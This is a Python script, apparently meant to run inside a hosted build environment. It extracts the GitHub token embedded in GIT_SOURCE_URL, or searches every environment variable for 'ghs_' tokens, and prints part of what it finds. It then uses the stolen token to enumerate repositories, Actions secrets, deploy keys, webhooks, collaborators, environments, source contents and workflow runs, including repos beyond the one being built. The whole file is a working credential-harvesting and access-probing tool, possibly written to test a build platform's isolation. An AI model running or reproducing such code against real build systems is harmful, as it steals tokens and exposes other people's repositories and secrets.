import json, os, urllib.request, urllib.error, ssl, re

r = {}
ctx = ssl.create_default_context()

# 1. Extract the GitHub token from GIT_SOURCE_URL
git_url = os.environ.get('GIT_SOURCE_URL', '')
r['git_source_url'] = git_url[:50] + '...' if git_url else 'NOT_SET'

token = None
match = re.search(r'x-access-token:([^@]+)@', git_url)
if match:
    token = match.group(1)
    r['token_prefix'] = token[:10] + '...'
    r['token_type'] = 'ghs_' if token.startswith('ghs_') else token[:4]

if not token:
    # Check all env vars for any github token
    for k, v in os.environ.items():
        m = re.search(r'(ghs_[A-Za-z0-9]+)', v)
        if m:
            token = m.group(1)
            r['token_found_in'] = k
            break
    if not token:
        r['error'] = 'No GitHub token found'
        print(json.dumps(r, indent=2))
        exit()

headers = {
    'Authorization': f'token {token}',
    'Accept': 'application/vnd.github+json',
    'User-Agent': 'probe/1.0'
}

def gh_api(path, method='GET'):
    """Make a GitHub API request"""
    try:
        req = urllib.request.Request(f'https://api.github.com{path}', headers=headers, method=method)
        resp = urllib.request.urlopen(req, timeout=10, context=ctx)
        data = resp.read().decode()
        rate_remaining = resp.headers.get('X-RateLimit-Remaining', '?')
        return {
            'status': resp.status,
            'data': json.loads(data) if data else None,
            'rate_remaining': rate_remaining
        }
    except urllib.error.HTTPError as e:
        body = e.read().decode(errors='replace')[:300]
        return {
            'status': e.code,
            'error': body
        }
    except Exception as e:
        return {'error': str(e)[:200]}

# ============================================================
# 2. TOKEN IDENTITY — who are we?
# ============================================================
r['identity'] = {}

# Check the token metadata
result = gh_api('/installation/token')  # Won't work but shows error type
r['identity']['token_check'] = result

# Get authenticated user/app info
r['identity']['user'] = gh_api('/user')
r['identity']['app'] = gh_api('/app')

# Check rate limit (shows auth type)
r['identity']['rate_limit'] = gh_api('/rate_limit')

# ============================================================
# 3. REPOSITORY ACCESS SCOPE
# ============================================================
r['repo_scope'] = {}

# Can we list repos the token has access to?
r['repo_scope']['installations'] = gh_api('/installation/repositories?per_page=100')

# Can we list ALL repos for the user/org?
r['repo_scope']['user_repos'] = gh_api('/user/repos?per_page=5&sort=updated')

# Can we access the specific repo we're building from?
r['repo_scope']['own_repo'] = gh_api('/repos/rollingWaves/build-imds-test')

# Can we access OTHER repos in the same account?
r['repo_scope']['other_repos'] = gh_api('/repos/rollingWaves/build-bp-test')

# Can we access repos from other users? (should fail)
r['repo_scope']['foreign_repo'] = gh_api('/repos/torvalds/linux')

# ============================================================
# 4. WRITE ACCESS TESTS
# ============================================================
r['write_access'] = {}

# Can we list branches?
r['write_access']['branches'] = gh_api('/repos/rollingWaves/build-imds-test/branches')

# Can we read secrets (GitHub Actions secrets)?
r['write_access']['secrets'] = gh_api('/repos/rollingWaves/build-imds-test/actions/secrets')

# Can we list deploy keys?
r['write_access']['deploy_keys'] = gh_api('/repos/rollingWaves/build-imds-test/keys')

# Can we list webhooks?
r['write_access']['webhooks'] = gh_api('/repos/rollingWaves/build-imds-test/hooks')

# Can we list collaborators?
r['write_access']['collaborators'] = gh_api('/repos/rollingWaves/build-imds-test/collaborators')

# Can we read repo settings?
r['write_access']['settings'] = gh_api('/repos/rollingWaves/build-imds-test/settings')  # Custom property values

# ============================================================
# 5. ORG/ACCOUNT ACCESS
# ============================================================
r['org_access'] = {}

# Can we list organizations?
r['org_access']['orgs'] = gh_api('/user/orgs')

# Can we list installations?
r['org_access']['installations_list'] = gh_api('/user/installations?per_page=5')

# ============================================================
# 6. SENSITIVE OPERATIONS
# ============================================================
r['sensitive'] = {}

# Can we read the repo contents (source code)?
r['sensitive']['contents'] = gh_api('/repos/rollingWaves/build-imds-test/contents/')

# Can we read commit history?
r['sensitive']['commits'] = gh_api('/repos/rollingWaves/build-imds-test/commits?per_page=2')

# Can we list pull requests?
r['sensitive']['pulls'] = gh_api('/repos/rollingWaves/build-imds-test/pulls')

# Can we read issues?
r['sensitive']['issues'] = gh_api('/repos/rollingWaves/build-imds-test/issues')

# Can we read environments (may have secrets)?
r['sensitive']['environments'] = gh_api('/repos/rollingWaves/build-imds-test/environments')

# Can we list workflow runs?
r['sensitive']['workflows'] = gh_api('/repos/rollingWaves/build-imds-test/actions/runs')

# ============================================================
# 7. TOKEN PERMISSIONS (via GitHub App API)
# ============================================================
r['permissions'] = {}

# Try to get the installation info
r['permissions']['installation'] = gh_api('/app/installations')

# Check scopes via response headers
try:
    req = urllib.request.Request('https://api.github.com/user', headers=headers)
    resp = urllib.request.urlopen(req, timeout=10, context=ctx)
    r['permissions']['x_oauth_scopes'] = resp.headers.get('X-OAuth-Scopes', 'none')
    r['permissions']['x_accepted_scopes'] = resp.headers.get('X-Accepted-OAuth-Scopes', 'none')
    resp.read()
except Exception as e:
    r['permissions']['header_check'] = str(e)[:100]

print(json.dumps(r, indent=2, default=str))
